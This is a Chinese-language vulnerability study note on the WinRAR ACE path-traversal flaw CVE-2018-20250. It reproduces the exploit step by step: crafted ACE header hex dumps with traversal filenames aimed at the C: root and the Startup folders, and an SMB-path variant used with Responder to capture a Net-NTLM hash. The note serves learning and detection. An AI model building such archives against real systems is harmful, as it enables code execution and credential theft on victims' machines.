## 《Extracting a 19 Year Old Code Execution from WinRAR》winrar目录穿越漏洞分析学习笔记

**背景说明：**

WinRAR 作为最流行的解压缩软件，支持多种压缩格式的压缩和解压缩功能。其中的一个压缩组件ACE解压缩模块的远程代码执行漏洞（CVE-2018-20250）影响面较广。winrar等调用unacev2.dll库进行ACE格式文件解压时，由于未对文件名进行充分过滤，导致可实现目录穿越，将构造好的文件写入任意目录（写入启动项中则导致代码执行）。

**影响面：**

调用unacev2.dll进行ACE解压的组件都会受到影响，一些软件需在设置中勾选支持ACE

> *软件：*
>
> WinRAR < 5.70 Beta 1
>
> Bandizip < = 6.2.0.0
>
> 好压(2345压缩) < = 5.9.8.10907
>
> 360压缩 < = 4.0.0.1170

**漏洞分析：**

造成该漏洞的主要模块为unacev2.dll,当该模块对ACE文件进行解压时，将对解压缩路径进行验证，从压缩文件中提取（ACE header 头的  filename 处获取的）待解压文件的相对路径file_relative_path,使用GetDevicePathLen(file_relative_path)和cleanPath对其进行校验处理，根据返回结果进行最终解压缩路径拼接解压执行。

```c
在地址0x0040cc18处可以看到
漏洞利用点代码：
if ( GetDevicePathLen(a2, file_relative_path) )
    v7 = &empty_string;
else
    LOBYTE(v7) = add_slash();
sprintf(final_file_path, "%s%s", (char)v7); 

根据GetDevicePathLen 返回值
当为0时，将winrar解压路径与压缩中提取的相对路径拼接
sprintf(final_file_path, "%s%s", destination_folder, file_relative_path);
非0时，压缩文件的相对路径为主
sprintf(final_file_path, "%s%s", "", file_relative_path);
```

所以很明显sprintf 是最后触发 Path Traversal的问题的函数，

但在构建漏洞利用时，针对典型的保护机制绕过和攻击，从函数内部机制说起

1. 对**GetDevicePathLen** 进行解析

![fig16.jpg](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/windows/app/winrar/fig16.jpg?raw=true)

GetDevicePathLen(a2, file_relative_path) 

输入为：提取文件的相对路径

功能：检查设备或者驱动盘名前缀是否出现在 路径中，返回该字符串长度

```
该函数为此路径返回长度3：C:\some_folder\some_file.ext    C：\ -->3
该函数为此路径返回1：\some_folder\some_file.ext
该函数为此路径返回15：\\LOCALHOST\C$\some_folder\some_file.ext
该函数为此路径返回21：\\?\Harddisk0Volume1\some_folder\some_file.ext
该函数为此路径返回0：some_folder\some_file.ext
```

如果大于 0 在 视为完整路径（可用路径），否则为非完整路径

2. 但是调动 GetDevicePathLen 之前还有 **CleanPath**函数，功能主要为过滤一些路劲序列

   ![fig17.jpg](https://github.com/zhongshendoushuizhao/project/blob/master/vul_learn/windows/app/winrar/fig17.jpg?raw=true)

```
 \..\   -->   去掉..\   -->  \
 c:\     -->     "" 清除
 C:\C:  -->   “”  清除
 
其他被清除符号：   “ _:\”，“ _:”，“ _:\_:”
```

则其在攻击时，进行了两次绕过

则要实现

sprintf(final_file_path, "%s%s", "", file_relative_path); 的 空字符拼接

则 `GetDevicePathLen`函数的结果应大于0. 

同时，过滤后仍为可访问路径



1. **则通过 c:\c:\ 来进行伪装 使  返回值 大于0 同时  造成   过滤掉 C:\C：  变为 \ 相对路径**

2. 通过

```
相对路径C:\\\10.10.10.10\smb_folder_name\some_folder\some_file.ext   
最终路径\\10.10.10.10\smb_folder_name\some_folder\some_file.ext
可以实现SMB服务器的任意路径访问后者常见文件或文件夹。
```



**攻击者给出的绕过利用思路：**

```
1.攻击方法：使用漏洞，将恶意文件静默释放至可能造成危害的路径中实现攻击。
恶意的相对路径：C:\C:\some_folder\some_file.ext
最终的解压路径：C:\some_folder\some_file.ext
构造 C:\C:\这种结构是在解析时，提取盘符头后，直接造成相对路径为释放路径
```

```
2.攻击方法：获取受害者的Net-NTLM hash，从而使用NTLM Relay的方式攻击受害者。
恶意的相对路径：C:\\10.10.10.10\smb_folder_name\some_folder\some_file.ext
最终的解压路径：\10.10.10.10\smb_folder_name\some_folder\some_file.ext
构造\\造成解析时 会多一个\ 从而造成相对共享的攻击效果
```

> 在普通用户权限下：
>
> 会将文件默认释放到 
>
> 用户启动目录（”C:\Users\<user name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”
>
> 而不是
>
> 系统启动目录（”C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”）
>
> 定向的账户攻击就可能需要对目标进行登录用户名信息搜集
>
> 而常规的直接下载到桌面或针对用户名下目录的则没有这个问题

fuzz作者构造的攻击payload

```
构造路径：C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe
最终解释路径：C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe

采用的是绕过过滤的方法。
在解释道最终路径后
../会返回到 user folder 
并连接  AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ 目录
直接拼接出自启动项的路径。
```

**[攻击复现：](https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/)**

1. **制作投递payload**

   这里用简单的TXT文件来当做投递pyload 

   ```cmd
   echo AAAAAAAAAA >> TESTPAYLOD.txt
   ```

2. **进行ACE压缩**，选用 [`WinACE`](https://web.archive.org/web/20170714193504/http:/winace.com:80/)工具压缩。选择 保存 压缩全路径 stroe full path

3. **进行数据格式对照**，提供了一个ACE格式解析脚本 [acefile.py](https://github.com/droe/acefile/blob/master/acefile.py)（py3版本），使用python acefile.py  --headers  xxx.ace 来获取文件头信息

   ```cmd
   C:\Users\c\Desktop>python acefile.py --headers TESTPAYLOD.
   volume
       filename    TESTPAYLOD.ace
       filesize    132
       headers     MAIN:1 FILE:1 others:0
   header
       hdr_crc     0x45b5
       hdr_size    49
       hdr_type    0x00        MAIN
       hdr_flags   0x9000      ADVERT|SOLID
       magic       b'**ACE**'
       eversion    20          2.0
       cversion    20          2.0
       host        0x02        Win32
       volume      0
       datetime    0x4e5b546f  2019-02-27 10:35:30
       reserved1   e8 03 5d e6 00 00 00 00
       advert      b'*UNREGISTERED VERSION*'
       comment     b''
       reserved2   b''
   header
       hdr_crc     0x1ce9
       hdr_size    62
       hdr_type    0x01        FILE32
       hdr_flags   0x8001      ADDSIZE|SOLID
       packsize    13
       origsize    13
       datetime    0x4e5b538e  2019-02-27 10:28:28
       attribs     0x00000020  ARCHIVE
       crc32       0x7c434d5c
       comptype    0x00        stored
       compqual    0x03        normal
       params      0x000a
       reserved1   0x4554
       filename    b'Users\\\xe7\xfd\\Desktop\\TESTPAYLOD.txt'
       comment     b''
       ntsecurity  b''
       reserved2   b''
   
   ```

   > 在选择压缩保存全路径时，会看到  
   >
   > filename    b'Users\\\xe7\xfd\\Desktop\\TESTPAYLOD.txt'
   >
   > 不保存全路径
   >
   > filename    b'TESTPAYLOD01.txt'

   漏洞利用读取压缩包的相对路径是通过，ACE header 头的  filename 处获取的。所以我们对照数据格式进行分析处理最好。

   用 editor工具，查看二进制文件内容

   ```
   00000000h: B5 45 31 00 00 00 90 2A 2A 41 43 45 2A 2A 14 14 ; 礒1...?*ACE**..
   00000010h: 02 00 6F 54 5B 4E E8 03 5D E6 00 00 00 00 16 2A ; ..oT[N?]?....*
   00000020h: 55 4E 52 45 47 49 53 54 45 52 45 44 20 56 45 52 ; UNREGISTERED VER
   00000030h: 53 49 4F 4E 2A "E9 1C""3E 00" 01 01 80 0D 00 00 00 ; SION*?>...€....
   00000040h: 0D 00 00 00 8E 53 5B 4E 20 00 00 00 5C 4D 43 7C ; ....嶴[N ...\MC|
   00000050h: 00 03 0A 00 54 45 "1F 00""55 73 65 72 73 5C E7 FD ; ....TE..Users\琮
   00000060h: 5C 44 65 73 6B 74 6F 70 5C 54 45 53 54 50 41 59 ; \Desktop\TESTPAY
   00000070h: 4C 4F 44 2E 74 78 74" 41 41 41 41 41 41 41 41 41 ; LOD.txtAAAAAAAAA
   00000080h: 41 20 0D 0A                                     ; A ..
   ```

​      我们通过对比header 头信息 和 二进制比对 ，可以通过偏移找到。

```
  header头中的值

      hdr_crc  0x1ce9       校验

      hdr_size   62  (3e)    长度

      filename 的长度（在filename字段前）  1F 00  （ 31 ）    

      filename 内容     Users\\\xe7\xfd\\Desktop\\TESTPAYLOD.txt

     我们通过修改filename 内容 同时 修改 校验  长度 等 数值 来 构造 恶意压缩包
```

4. **构造恶意ACE数据包**

​          我们先按照最基础的方式构造 C:\C:\ 式攻击方法，

​          我们构造数据为如下格式

```cmd
00000000h: B5 45 31 00 00 00 90 2A 2A 41 43 45 2A 2A 14 14 ; 礒1...?*ACE**..
00000010h: 02 00 6F 54 5B 4E E8 03 5D E6 00 00 00 00 16 2A ; ..oT[N?]?....*
00000020h: 55 4E 52 45 47 49 53 54 45 52 45 44 20 56 45 52 ; UNREGISTERED VER
00000030h: 53 49 4F 4E 2A 89 45 33 00 01 01 80 0D 00 00 00 ; SION*塃3...€....
00000040h: 0D 00 00 00 8E 53 5B 4E 20 00 00 00 5C 4D 43 7C ; ....嶴[N ...\MC|
00000050h: 00 03 0A 00 54 45 14 00 43 3A 5C 43 3A 5C 54 45 ; ....TE..C:\C:\TE
00000060h: 53 54 50 41 59 4C 4F 44 2E 74 78 74 41 41 41 41 ; STPAYLOD.txtAAAA
00000070h: 41 41 41 41 41 41 20 0D 0A                      ; AAAAAA ..
```

> 分别修改 
>
> filename 为 C:\C:\TESTPAYLOAD.txt
>
> 字符串长度  改为 14h
>
> hdr_size    改为 33h
>
> hdr_crc     45 89h
>
> hdr_crc 的获取参找了 直接用脚本更改的方法
>
> if len(buf) < hsize:
> ​            raise CorruptedArchiveError("truncated header")
> ​        if ace_crc16(buf) != hcrc:
> ​            print(ace_crc16(buf),buf)   《--------直接打印出校验值 
> ​            raise CorruptedArchiveError("header CRC failed")
>
> 对比更改CRC 前后

```
>python acefile.py --headers TESTPAYLOD.ace
17801 b'\x01\x01\x80\r\x00\x00\x00\r\x00\x00\x00\x8eS[N \x00\x00\x00\\
3\n\x00TE\x14\x00C:\\C:\\TESTPAYLOD.txt'
TESTPAYLOD.ace: CorruptedArchiveError: header CRC failed

>python acefile.py --headers TESTPAYLOD.ace
volume
    filename    TESTPAYLOD.ace
    filesize    121
    headers     MAIN:1 FILE:1 others:0
header
    hdr_crc     0x45b5
    hdr_size    49
    hdr_type    0x00        MAIN
    hdr_flags   0x9000      ADVERT|SOLID
    magic       b'**ACE**'
    eversion    20          2.0
    cversion    20          2.0
    host        0x02        Win32
    volume      0
    datetime    0x4e5b546f  2019-02-27 10:35:30
    reserved1   e8 03 5d e6 00 00 00 00
    advert      b'*UNREGISTERED VERSION*'
    comment     b''
    reserved2   b''
header
    hdr_crc     0x4589
    hdr_size    51
    hdr_type    0x01        FILE32
    hdr_flags   0x8001      ADDSIZE|SOLID
    packsize    13
    origsize    13
    datetime    0x4e5b538e  2019-02-27 10:28:28
    attribs     0x00000020  ARCHIVE
    crc32       0x7c434d5c
    comptype    0x00        stored
    compqual    0x03        normal
    params      0x000a
    reserved1   0x4554
    filename    b'C:\\C:\\TESTPAYLOD.txt'   <--篡改成功
    comment     b''
    ntsecurity  b''
    reserved2   b''


```

5. **直接进行解压，攻击**，可造成在C盘目录下 释放  TESTPAYLOD.txt文件

```
C:\>dir
 驱动器 C 中的卷没有标签。
 卷的序列号是 2E73-CE10

 C:\ 的目录

2009/07/14  11:20    <DIR>          PerfLogs
2019/02/26  10:49    <DIR>          Program Files
2019/02/26  11:06    <DIR>          Program Files (x86)
2019/02/15  17:03    <DIR>          Python27
2019/02/27  10:28                13 TESTPAYLOD.txt     <-------释放成功
2016/09/05  10:22    <DIR>          Users
2019/02/26  11:18    <DIR>          Windows
```

6. **其他攻击方式和可能性测试**

- **不使用全路径压缩保存ACE，进行攻击**

  在压缩文件时 不选择全目录，构造ACE压缩包如下

  ```cmd
  00000000h: 0E 49 31 00 00 00 90 2A 2A 41 43 45 2A 2A 14 14 ; .I1...?*ACE**..
  00000010h: 02 00 79 54 5B 4E FE 03 4B E6 4E 20 00 00 16 2A ; ..yT[N?K鍺 ...*
  00000020h: 55 4E 52 45 47 49 53 54 45 52 45 44 20 56 45 52 ; UNREGISTERED VER
  00000030h: 53 49 4F 4E 2A 2C 7C 36 00 01 01 80 0D 00 00 00 ; SION*,|6...€....
  00000040h: 0D 00 00 00 61 54 5B 4E 20 00 00 00 5C 4D 43 7C ; ....aT[N ...\MC|
  00000050h: 00 03 0A 00 54 45 17 00 43 3A 5C 43 3A 5C 54 45 ; ....TE..C:\C:\TE
  00000060h: 53 54 50 41 59 4C 4F 41 44 30 31 2E 74 78 74 41 ; STPAYLOAD01.txtA
  00000070h: 41 41 41 41 41 41 41 41 41 20 0D 0A             ; AAAAAAAAA ..
  ```

  修改好校验

  ```cmd
  >python acefile.py --headers TESTPAYLOD01.ace
  31788 b'\x01\x01\x80\r\x00\x00\x00\r\x00\x00\x00aT[N \x00\x00\x00\\MC|\x00\x03\n
  \x00TE\x17\x00C:\\C:\\TESTPAYLOAD01.txt'
  TESTPAYLOD01.ace: CorruptedArchiveError: header CRC failed
  
  >python acefile.py --headers TESTPAYLOD01.ace
  volume
      filename    TESTPAYLOD01.ace
      filesize    124
      headers     MAIN:1 FILE:1 others:0
  header
      hdr_crc     0x490e
      hdr_size    49
      hdr_type    0x00        MAIN
      hdr_flags   0x9000      ADVERT|SOLID
      magic       b'**ACE**'
      eversion    20          2.0
      cversion    20          2.0
      host        0x02        Win32
      volume      0
      datetime    0x4e5b5479  2019-02-27 10:35:50
      reserved1   fe 03 4b e6 4e 20 00 00
      advert      b'*UNREGISTERED VERSION*'
      comment     b''
      reserved2   b''
  header
      hdr_crc     0x7c2c
      hdr_size    54
      hdr_type    0x01        FILE32
      hdr_flags   0x8001      ADDSIZE|SOLID
      packsize    13
      origsize    13
      datetime    0x4e5b5461  2019-02-27 10:35:02
      attribs     0x00000020  ARCHIVE
      crc32       0x7c434d5c
      comptype    0x00        stored
      compqual    0x03        normal
      params      0x000a
      reserved1   0x4554
      filename    b'C:\\C:\\TESTPAYLOAD01.txt'
      comment     b''
      ntsecurity  b''
      reserved2   b''
  ```

  进行攻击尝试，发现可以实现攻击

  ```cmd
  C:\>dir
   驱动器 C 中的卷没有标签。
   卷的序列号是 2E73-CE10
  
   C:\ 的目录
  
  2009/07/14  11:20    <DIR>          PerfLogs
  2019/02/26  10:49    <DIR>          Program Files
  2019/02/26  11:06    <DIR>          Program Files (x86)
  2019/02/15  17:03    <DIR>          Python27
  2019/02/27  10:35                13 TESTPAYLOAD01.txt
  2016/09/05  10:22    <DIR>          Users
  2019/02/26  11:18    <DIR>          Windows
  ```

  不过在win7开启UAC 等保护的情况下，确实会出现漏洞分析时讲过的释放目录不同的情况

- **构造进行系统默认自启动目录攻击**

  win7情况下，直接采用，挖掘作者的payload ,测试，仅在桌面上解压文件夹中生成相应目录，释放文件，这个是构造的payload的问题应该为，才可以攻击成功

  ```
  C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe
  ```

  ```cmd
  00000000h: B5 45 31 00 00 00 90 2A 2A 41 43 45 2A 2A 14 14 ; 礒1...?*ACE**..
  00000010h: 02 00 6F 54 5B 4E E8 03 5D E6 00 00 00 00 16 2A ; ..oT[N?]?....*
  00000020h: 55 4E 52 45 47 49 53 54 45 52 45 44 20 56 45 52 ; UNREGISTERED VER
  00000030h: 53 49 4F 4E 2A D9 E9 71 00 01 01 80 0D 00 00 00 ; SION*匍q...€....
  00000040h: 0D 00 00 00 8E 53 5B 4E 20 00 00 00 5C 4D 43 7C ; ....嶴[N ...\MC|
  00000050h: 00 03 0A 00 54 45 52 00 43 3A 2E 2E 2F 41 70 70 ; ....TER.C:../App
  00000060h: 44 61 74 61 5C 52 6F 61 6D 69 6E 67 5C 4D 69 63 ; Data\Roaming\Mic
  00000070h: 72 6F 73 6F 66 74 5C 57 69 6E 64 6F 77 73 5C 53 ; rosoft\Windows\S
  00000080h: 74 61 72 74 20 4D 65 6E 75 5C 50 72 6F 67 72 61 ; tart Menu\Progra
  00000090h: 6D 73 5C 53 74 61 72 74 75 70 5C 54 45 53 54 50 ; ms\Startup\TESTP
  000000a0h: 41 59 4C 4F 41 44 2E 74 78 74 41 41 41 41 41 41 ; AYLOAD.txtAAAAAA
  000000b0h: 41 41 41 41 20 0D 0A                            ; AAAA ..
  ```

  采用payload

  ```
  C:\C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\some_file.exe
  ```

  ```cmd
  00000000h: B5 45 31 00 00 00 90 2A 2A 41 43 45 2A 2A 14 14 ; 礒1...?*ACE**..
  00000010h: 02 00 6F 54 5B 4E E8 03 5D E6 00 00 00 00 16 2A ; ..oT[N?]?....*
  00000020h: 55 4E 52 45 47 49 53 54 45 52 45 44 20 56 45 52 ; UNREGISTERED VER
  00000030h: 53 49 4F 4E 2A AA 89 6E 00 01 01 80 0D 00 00 00 ; SION*獕n...€....
  00000040h: 0D 00 00 00 8E 53 5B 4E 20 00 00 00 5C 4D 43 7C ; ....嶴[N ...\MC|
  00000050h: 00 03 0A 00 54 45 4F 00 43 3A 5C 43 3A 5C 50 72 ; ....TEO.C:\C:\Pr
  00000060h: 6F 67 72 61 6D 44 61 74 61 5C 4D 69 63 72 6F 73 ; ogramData\Micros
  00000070h: 6F 66 74 5C 57 69 6E 64 6F 77 73 5C 53 74 61 72 ; oft\Windows\Star
  00000080h: 74 20 4D 65 6E 75 5C 50 72 6F 67 72 61 6D 73 5C ; t Menu\Programs\
  00000090h: 53 74 61 72 74 75 70 5C 54 45 53 54 50 41 59 4C ; Startup\TESTPAYL
  000000a0h: 4F 41 44 2E 74 78 74 41 41 41 41 41 41 41 41 41 ; OAD.txtAAAAAAAAA
  000000b0h: 41 20 0D 0A                                     ; A ..
  ```

  可以成功攻击

  ```cmd
  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup>dir
   驱动器 C 中的卷没有标签。
   卷的序列号是 2E73-CE10
  
   C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 的目录
  
  2019/02/27  13:25    <DIR>          .
  2019/02/27  13:25    <DIR>          ..
  2019/02/27  10:28                13 TESTPAYLOAD.txt
                 1 个文件             13 字节
                 2 个目录 52,365,533,184 可用字节
  ```

- **构造进行 获取受害者的Net-NTLM hash 的攻击方式**

  暂未尝试在SMB服务器上创建文件或文件夹

  先说明相关NTLM tray 的知识

  > [hash知识](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/)
  >
  > NTLM hash：指Windows系统下Security Account Manager中保存的用户密码hash
  >
  > Net-NTLM hash: 指网络环境下NTLM认证中的hash
  >
  > NTLM认证采用质询/应答（Challenge/Response）的消息交换模式，流程如下：
  >
  > 1. 客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash
  > 2. 服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge1
  > 3. 客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器
  > 4. 服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功
  >
  > 常见的Net-NTLM hash 的攻击方式
  >
  > 1. 使用中间人攻击的方式来获取Net-NTLM hash
  > 2. 通过多种方式强制目标客户端向伪造的服务器发起SMB连接，在伪造的服务器上捕获数据包，获得Net-NTLM hash
  >
  > 其他攻击思路:
  >
  > 1. [利用图标文件获取连接文件服务器的NTLMv2 Hash](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E5%9B%BE%E6%A0%87%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/)
  > 2. [利用netsh抓取连接文件服务器的NTLMv2 Hash](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/)
  > 3. [通过HTTP协议获得Net-NTLM hash](https://www.secpulse.com/archives/71555.html)
  >
  > 相关工具：
  >
  > [Responder ](https://github.com/lgandx/Responder)
  >
  > [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

  我们可以直接使用Responder 脚本，通过 python Responder.py -I eth0 -rPv  进行伪造的SMB默认监听

  然后在ACE压缩文件中  构造 

  ```
  C:\\10.10.10.10\smb_folder_name\some_folder\some_file.ext
  在漏洞解析后
  \10.10.10.10\smb_folder_name\some_folder\some_file.ext
  实质造成 \伪造服务地址\ 的登录访问，从而造成。
  Net-NTLM hash 的泄露
  ```

  启动Responder

  ```
  python Responder.py -I eth0 -rPv
                                           __
    .----.-----.-----.-----.-----.-----.--|  |.-----.----.
    |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
    |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                     |__|
  
             NBT-NS, LLMNR & MDNS Responder 2.3.3.9
  
    Author: Laurent Gaffie (laurent.gaffie@gmail.com)
    To kill this script hit CTRL-C
  
  
  [+] Poisoners:
      LLMNR                      [ON]
      NBT-NS                     [ON]
      DNS/MDNS                   [ON]
  ...
  ```

  解压ACE压缩包。触发

  触发 /xxx.xx.xx.216/的地址访问。（在此处也可构造，smb服务任意文件创建）

  获取到hash

  ```
  [HTTP] Sending NTLM authentication request to xxx.xx.xx.28
  [HTTP] GET request from: xxx.xx.xx.28     URL: /
  [HTTP] Host             : xxx.xx.xx.216
  [HTTP] NTLMv2 Client   : xxx.xx.xx.28
  [HTTP] NTLMv2 Username : \admin
  [HTTP] NTLMv2 Hash     : admin:::fd0cxxxxxx05ba4:E0C4B8BA07C1BB55D0975E186D4EDEB4:01010000000000008B01EC2274CED401B2C1CB919F7872C0000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0A001000000000000000000000000000000000000900240048005400540050002F003100370032002E00330031002E00350030002E003200310036000000000000000000
  ```





**攻击案例分析**

360情报中心的[WinRAR漏洞传播的恶意样本分析](https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&mid=2247486933&idx=1&sn=58b7daf1d550e72dd8f952eee8610a70&chksm=ea65faa2dd1273b4cf7f470dd8d7c9e49305ff8fe178541e5fa175a4704485131480dd49af59&mpshare=1&scene=23&srcid=0225SFamVMxMie0TGgKstFqD#rd) 、[WinRAR漏洞利用升级：社工、加密、无文件后门](https://mp.weixin.qq.com/s/hAoee3Z90FyxSdomHfqZqA)

可以看到通过winrar漏洞攻击方式， 同时采用  社工、诱导等方式进行载荷投递，以及定向性的垃圾邮件散布方式嵌入无文件加密后门等攻击方式。来进行肉鸡抓取、APT攻击等相关攻击方法。

![img](https://mmbiz.qpic.cn/mmbiz_png/2AqAgxkehic8bd9gZgga0S0JJtzXTIiaaTd9wjmuiaCbVCJbphZcice18PvGFfqxktwY4KFicmXxkRE7cJ8KEBPiaQLw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

进行了典型的启动目录释放方法



**修复建议：**

WinRAR决定从他们的软件包中删除UNACEV2.dll，而WinRAR不支持版本号为“5.70 beta 1”的ACE格式。



**后续延伸思考**

1. 特征方面检测，这种攻击方式的显著要点是 **文件格式**、以及**典型的目录选择** 才能达到理想的攻击效果，同时木马本身的相关dorp之类的也会存储在压缩包中，方便检测，故yara规则编写，可以按照，文件格式（有特定偏移）、攻击目录、样本特征来进行提取
2. 挖掘FUZZ思路

通过阅读挖掘作者[Extracting a 19 Year Old Code Execution from WinRAR](https://research.checkpoint.com/extracting-code-execution-from-winrar/)文章

作者的介绍了自己的 大致FUZZ思路和挖掘过程，确定fuzz对象后

1. 在WinRAR main函数中创建内部工具，使我们能够模糊任何存档类型，而不需要为每种格式缝合特定的工具。这是通过修补WinRAR可执行文件来完成的
2. 消除需要用户交互的GUI元素，如消息框和对话框。这也可以通过修补WinRAR可执行文件来实现
3. 使用了XX大学的规则库
4. 使用WinRAR命令行开关用WinAFL模糊程序。这迫使WinRAR解析“损坏的存档文件”，并设置默认密码(密码为“-p”，保存损坏的提取文件为“-kb”)。我们在WinRAR手册/帮助文件中找到了这些选项

在解析ACE时造成明显的crash，定位明显无保护的unacev2.dll

在针对unacev2.dll进行特定fuzz 后

定位明显的两个函数：

```c
INT __stdcall ACEInitDll(unknown_struct_1 *struct_1);

INT __stdcall ACEExtract(LPSTR ArchiveName, unknown_struct_2 *struct_2);
```

在未知一个函数结构体时，提供了两种思路

- 反编译 + 动态调试 WinRAR
- 通过开源项目进行搜寻，并通过 [FarManager](https://github.com/FarGroup/FarManager) 找到

```c
INT __stdcall ACEInitDll(pACEInitDllStruc DllData);

INT __stdcall ACEExtract(LPSTR ArchiveName, pACEExtractStruc Extract);
```

并找到了两个较为有用的工具

> 唯一允许创建ACE存档的软件是[`WinACE`](https://web.archive.org/web/20170714193504/http:/winace.com:80/)
>
> [`acefile`](https://pypi.org/project/%3Ccode%3Eacefile%3C/code%3E%20/) 这个[维基百科页面中](https://en.wikipedia.org/wiki/ACE_(compressed_file_format))提到了一个名为纯Python的项目。它最有用的功能是：
>
> - 它可以提取ACE档案。
> - 它包含有关ACE文件格式的简要说明。
> - 它有一个非常有用的功能，打印文件格式标题和解释。

在后序的模糊测试中，实现了本地目录文件释放

> `filename`触发错误的字段示例：`\some_folder\some_file*.exe`将被解压缩到`C:\some_folder\some_file_.exe`，并且星号将转换为下划线（_）。



在于WINrar的对抗中发现

> 执行以下检查：
>
> 1. 第一个字符不等于“ `\`”或“ `/`”。
> 2. 文件名不以以下字符串“ `..\`”或“ `../`” 开头，这些字符串是“Path Traversal”的小工具。
> 3. 字符串中不存在以下“Path Traversal”小工具：
>    1. “ `\..\`”
>    2. “ `\../`”
>    3. “ `/../`”
>    4. “ `/..\`”
>
>  WinRAR 中的`unacv2.dll`调用`StateCallbackProc`中的提取函数，并将`filename`ACE格式的字段作为要提取的相对路径传递。
>
> WinRAR回调的验证器检查相对路径。验证器返回`ACE_CALLBACK_RETURN_CANCEL` 到dll，（因为该`filename`字段以反斜杠“\”开头）并且文件创建被中止。

所以这也是造成有些直接执行会报错的原因





**引用链接：**

> https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/
>
> https://mp.weixin.qq.com/s?__biz=Mzg5MTA3NTg2MA==&mid=2247483812&idx=1&sn=91a32ac6a6eeb62798e08cbb74016042&chksm=cfd3addff8a424c9e25ee4b8c66ff62926a439ac840d9f19d7b98c5b2469e665d1a65d495dff&mpshare=1&scene=23&srcid=0222asR3sUEY3lBrRzpzWhUw#rd
>
> https://research.checkpoint.com/extracting-code-execution-from-winrar/
>
> https://xlab.tencent.com/cn/2019/02/22/investigating-winrar-code-execution-vulnerability-cve-2018-20250-at-internet-scale/
>
> https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&mid=2247486933&idx=1&sn=58b7daf1d550e72dd8f952eee8610a70&chksm=ea65faa2dd1273b4cf7f470dd8d7c9e49305ff8fe178541e5fa175a4704485131480dd49af59&mpshare=1&scene=23&srcid=0225SFamVMxMie0TGgKstFqD#rd